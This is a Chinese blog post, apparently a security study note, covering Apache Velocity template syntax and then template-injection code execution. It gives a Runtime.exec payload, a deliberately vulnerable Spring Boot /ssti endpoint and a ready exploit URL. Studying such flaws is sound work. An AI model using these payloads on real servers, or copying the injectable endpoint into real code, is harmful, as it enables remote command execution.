    <div class="post-body" itemprop="articleBody">

      
        <p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。</p>
<!--more->

添加`pom.xml`依赖：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.velocity/velocity --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;velocity&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.7&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p><strong>语句标识符</strong></p>
<p><code>#</code>用来标识Velocity的脚本语句，包括<code>#set</code>、<code>#if</code> 、<code>#else</code>、<code>#end</code>、<code>#foreach</code>、<code>#end</code>、<code>#include</code>、<code>#parse</code>、<code>#macro</code>等语句。</p>
<p><strong>变量</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$`用来标识一个变量，比如模板文件中为`Hello $a`，可以获取通过上下文传递的`$a</span><br></pre></td></tr></table></figure>

<p><strong>声明</strong></p>
<p><code>set</code>用于声明Velocity脚本变量，变量可以在脚本中声明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set($a =&quot;velocity&quot;)</span><br><span class="line">#set($b=1)</span><br><span class="line">#set($arrayName=[&quot;1&quot;,&quot;2&quot;])</span><br></pre></td></tr></table></figure>

<p><strong>注释</strong></p>
<p>单行注释为<code>##</code>，多行注释为成对出现的<code>#* ............. *#</code></p>
<p><strong>逻辑运算</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">== &amp;&amp; || !</span><br></pre></td></tr></table></figure>

<p><strong>条件语句</strong></p>
<p>以<code>if/else</code>为例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#if($foo&lt;10)</span><br><span class="line">    &lt;strong&gt;1&lt;/strong&gt;</span><br><span class="line">#elseif($foo==10)</span><br><span class="line">    &lt;strong&gt;2&lt;/strong&gt;</span><br><span class="line">#elseif($bar==6)</span><br><span class="line">    &lt;strong&gt;3&lt;/strong&gt;</span><br><span class="line">#else</span><br><span class="line">    &lt;strong&gt;4&lt;/strong&gt;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>

<p><strong>单双引号</strong></p>
<p>单引号不解析引用内容，双引号解析引用内容，与PHP有几分相似</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set ($var=&quot;aaaaa&quot;)</span><br><span class="line">&#x27;$var&#x27;  ## 结果为：$var</span><br><span class="line">&quot;$var&quot;  ## 结果为：aaaaa</span><br></pre></td></tr></table></figure>

<p><strong>属性</strong></p>
<p>通过<code>.</code>操作符使用变量的内容，比如获取并调用<code>getClass()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;)</span><br><span class="line">$e.getClass()</span><br></pre></td></tr></table></figure>

<p><strong>转义字符</strong></p>
<p>如果<code>$a</code>已经被定义，但是又需要原样输出<code>$a</code>，可以试用<code>\</code>转义作为关键的<code>$</code></p>
<h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h2><p>使用Velocity主要流程为：</p>
<ul>
<li>初始化Velocity模板引擎，包括模板路径、加载类型等</li>
<li>创建用于存储预传递到模板文件的数据的上下文</li>
<li>选择具体的模板文件，传递数据完成渲染</li>
</ul>
<p>VelocityTest.java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">package Velocity;</span><br><span class="line"></span><br><span class="line">import org.apache.velocity.Template;</span><br><span class="line">import org.apache.velocity.VelocityContext;</span><br><span class="line">import org.apache.velocity.app.VelocityEngine;</span><br><span class="line"></span><br><span class="line">import java.io.StringWriter;</span><br><span class="line"></span><br><span class="line">public class VelocityTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        VelocityEngine velocityEngine = new VelocityEngine();// 创建 Velocity 引擎</span><br><span class="line">        // 设置 Velocity 属性</span><br><span class="line">        //该代码指定了资源加载器类型为 file，意味着 Velocity 引擎将会从文件系统中加载模板文件。</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, &quot;file&quot;);</span><br><span class="line">        //该代码设置了文件资源加载器的基础路径，即模板文件所在的根目录。在这里，它被设置为 &quot;src/test/resources&quot;，表示模板文件将会从该路径下进行加载。</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, &quot;src/test/resources&quot;);</span><br><span class="line">        // 初始化 Velocity 引擎</span><br><span class="line">        velocityEngine.init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 设置数据模型</span><br><span class="line">        VelocityContext context = new VelocityContext();</span><br><span class="line">        context.put(&quot;name&quot;, &quot;ycxlo&quot;);</span><br><span class="line">        context.put(&quot;project&quot;, &quot;Velocity&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 加载模板文件</span><br><span class="line">        Template template = velocityEngine.getTemplate(&quot;VelocityTest.vm&quot;);</span><br><span class="line">        // 合并模板文件和数据模型</span><br><span class="line">        StringWriter sw = new StringWriter();</span><br><span class="line">        template.merge(context, sw);</span><br><span class="line">        // 输出合并结果</span><br><span class="line">        System.out.println(&quot;final output:&quot; + sw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模板文件VelocityTest.vm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is $name.</span><br><span class="line">Project is $project</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<p><img src="https://ilikeoyt.github.io/image/velocity1.png" alt="img"></p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>修改模板内容为恶意代码，通过<code>java.lang.Runtime</code>进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;)</span><br><span class="line">$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>

<p>首先构建一个漏洞代码服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package Velocity;</span><br><span class="line"></span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.apache.velocity.VelocityContext;</span><br><span class="line">import org.apache.velocity.app.Velocity;</span><br><span class="line">import java.io.StringWriter;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">class hhh &#123;</span><br><span class="line">    @GetMapping(&quot;/ssti&quot;)</span><br><span class="line">    public void velocity(String template) &#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line">        VelocityContext context = new VelocityContext();</span><br><span class="line">        context.put(&quot;name&quot;, &quot;lisi&quot;);</span><br><span class="line">        StringWriter swOut = new StringWriter();</span><br><span class="line">        Velocity.evaluate(context, swOut, &quot;test&quot;, template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@SpringBootApplication</span><br><span class="line">public class exp &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(exp.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Velocity.evaluate方法是Velocity模板引擎提供的一个核心方法，用于执行模板的渲染。它接受以下参数：</span><br><span class="line"></span><br><span class="line">VelocityContext context：表示Velocity的上下文对象，用于传递模板中需要的数据。在这个上下文对象中，可以使用put方法添加变量供模板使用。</span><br><span class="line"></span><br><span class="line">Writer writer：表示一个输出流对象，用于接收模板渲染后的结果。通常使用StringWriter或BufferedWriter等类的实例作为输出流。在示例中，使用的是StringWriter对象，将渲染结果输出到字符串中。</span><br><span class="line"></span><br><span class="line">String logTag：表示日志标签，用于在日志中标识该次渲染操作。通常用于调试和日志记录目的。</span><br><span class="line"></span><br><span class="line">String template：表示Velocity模板的内容，通常是一个包含Velocity语法的字符串。可以是硬编码的字符串，也可以是从外部获取的动态字符串。</span><br><span class="line"></span><br><span class="line">在Velocity.evaluate方法的执行过程中，Velocity会根据模板中的语法和上下文中的数据进行替换和计算，最终将渲染结果输出到提供的Writer对象中。</span><br></pre></td></tr></table></figure>

<p>启动服务后访问127.0.0.1:8080&#x2F;ssti?template&#x3D;%23set($e&#x3D;”e”);$e.getClass().forName(“java.lang.Runtime”).getMethod(“getRuntime”,null).invoke(null,null).exec(“calc”)</p>
<p>注意需要将#进行编码</p>

      localStorage.setItem('comments_active', commentClass);
    });
  }
